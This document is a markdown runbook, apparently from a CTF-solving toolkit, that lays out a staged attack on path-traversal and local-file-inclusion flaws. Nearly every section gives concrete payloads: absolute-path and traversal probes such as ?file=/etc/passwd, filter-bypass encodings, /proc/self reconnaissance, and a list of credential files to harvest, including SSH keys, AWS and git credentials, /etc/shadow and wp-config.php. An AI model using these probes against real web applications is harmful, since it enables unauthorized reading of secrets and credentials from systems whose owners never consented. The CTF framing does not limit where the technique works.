# Workflow — the ordered runbook

## Stage 0 — fingerprint the surface

- which param — `?file=`/`?path=`/`?doc=`/`?view=`/`?template=`/`?page=`/
  `?include=`/`?load=`/`?read=`/`?img=`/`?src=`/`?content=`/`?name=`/
  `?download=`/`?open=`/`?show=`/`?filename=`/`?filepath=`/`?resource=`/
  `?location=`/`?uri=`/`?url=`/`?doc_name=`/`?docname=`
- which stack — `.php`/`.py`/`.js`/`.jsp`/`.rb`/`.go`/`.cs`/`.aspx` —
  the stack names the sink-family — `per-stack.md`
- which response-shape — raw content vs JSON-field vs download vs
  template — `read-pipeline.md`

## Stage 1 — the absolute-path probe — `?file=/etc/passwd`

```
?file=/etc/passwd       → root:x:0:0: → confirms — absolute-path live
?file=/etc/hostname     → the hostname → confirms
?file=C:\Windows\win.ini → [fonts] → confirms — windows-stack
```

The canary is a file every system has — a verbatim-content echo proves
the read is live. `evidence-rules.md`.

## Stage 2 — the sink-type check — read vs exec vs oracle

| Signal | Sink-type |
|---|---|
| file's content echoes | `file_get_contents`/`readfile`/`open`/`fs.readFile` — READ |
| file's content parses as code | `include`/`require`/`load`/`eval(content)` — EXEC |
| hash/size/mime echoes | `md5_file`/`filesize`/`finfo_file`/`getimagesize` — ORACLE |
| dir-listing echoes | `glob`/`scandir`/`opendir`/`Dir.glob`/`File.list` — LISTING |
| nothing echoes | BLIND — timing/error/OOB channel — `blind-read.md` |

The sink decides which corpus — `include-vs-read.md`.

## Stage 3 — the confine-check — `realpath`/`open_basedir`/`chroot`

```
?file=../../etc/passwd → works → no confine OR the join-traversal works
?file=/etc/passwd → works → absolute-path live — the join replaces
?file=../../etc/passwd → fails + /etc/passwd works → confined
?file=/etc/passwd → "open_basedir restriction" → PHP-confine
?file=/etc/passwd → "File not found" but EXISTS → resolver-tried-missed
?file=/nonexistent → error-names-the-path → the oracle works
```

The confine decides the traversal-strategy — `denied-conditions.md`.

## Stage 4 — the encoding check — the filter-family

If `..`/absolute are stripped: `..%2f`/`%2e%2e%2f`/`..%5c`/`%252e%252e%252f`/
`....//`/`..%c0%af`/`..%ef%bc%8f`/`..;/`/`%00` — `encoding-tricks.md` —
the ERROR shows which layer stripped what — the oracle-driven encoding.

## Stage 5 — the self-recon — `/proc/self/*`

```
?file=/proc/self/environ     → FLAG=... / env-vars?
?file=/proc/self/cmdline     → /usr/bin/python3 /app/main.py
?file=/proc/self/cwd         → /app
?file=/proc/self/exe         → /usr/bin/python3
?file=/proc/self/mountinfo   → the mount-set
?file=/proc/self/status      → uid/gid/caps
?file=/proc/self/maps        → the mapped libs
?file=/proc/self/fd/0..20    → the open-fds
?file=/proc/net/tcp          → listening-services
?file=/proc/net/arp          → neighbors
```

`proc-filesystem.md`/`container-world.md`.

## Stage 6 — the app-source read

`?file=<app-path>` from `cmdline`/`cwd` — `source-location.md` for the
per-stack paths — `main.py`/`server.js`/`index.php`/`app.py`/`wsgi.py`/
`routes.rb`/`web.xml`/`web.config`/`WEB-INF/classes/application.properties`/
`composer.json`/`package.json`/`go.mod`/`requirements.txt`/`pom.xml` —
the source names the flag-path AND the creds.

## Stage 7 — the secrets harvest — the cred-corpus

`secrets-and-keys.md` — `.env`/`*.key`/`*.pem`/`.ssh/`/`.aws/`/`.kube/`/
`.docker/`/`.git-credentials`/`.netrc`/history-files/`/etc/shadow`/
`/etc/snmp/snmpd.conf`/`/etc/mysql/debian.cnf`/`/var/www/html/wp-config.php`/
`grafana.ini`/`tomcat-users.xml`/`gitlab-secrets.json` — the cred-corpus.

## Stage 8 — the flag-path read — `?file=<flag-path>`

`flag-paths.md` — `/flag`/`/app/flag`/`.env`/`/proc/1/environ`/
`/run/secrets/flag`/`/var/run/secrets/kubernetes.io/serviceaccount/*` —
the flag-path read.

## Stage 9 — the pre-flag — `hooks.py pre-flag`

```bash
python3 tools/hooks.py pre-flag <name> \
  --value "flag{...}" --source "<the path you read>"
```

The gate decides — the flag is verbatim in `--response`.

## Stage 10 — the write-back — record the solve

`post-probe --verdict confirms` + `classify_solve` + the chain-card —
the solve is recorded — `field-manual.md` stage 11.

## The "the read is blind" — the `blind-read.md` detour

If nothing echoes — `blind-read.md` — the `md5_file`/`filesize`/
`finfo_file`/`getimagesize`/`include-error`/`fd`/`timing` channels —
the non-echo oracles.

## The "the read is confined" — the `denied-conditions.md` detour

`open_basedir`/`realpath`/`chroot`/`send_from_directory`/`MapPath`/
`SecurityManager`/`AppArmor`/`SELinux`/`seccomp` — the wall-list —
`denied-conditions.md`.

## The "the read needs a chain" — the `exploit-ladders.md` detour

The read reveals the next layer — `exploit-ladders.md`/`read-to-rce.md` —
source→config→creds→exec→flag — the ladder.

## The "the read is dead" — the `refutes`-record

Every rung dead — record `verdict=refutes` + the kill-map — the next
attempt doesn't re-walk the dead layers.

## The "the flag is the goal" — the accept-the-read case

A read that lands on `flag{...}` — `pre-flag` — done — the read is
the goal for most CTF flags — no exec needed.
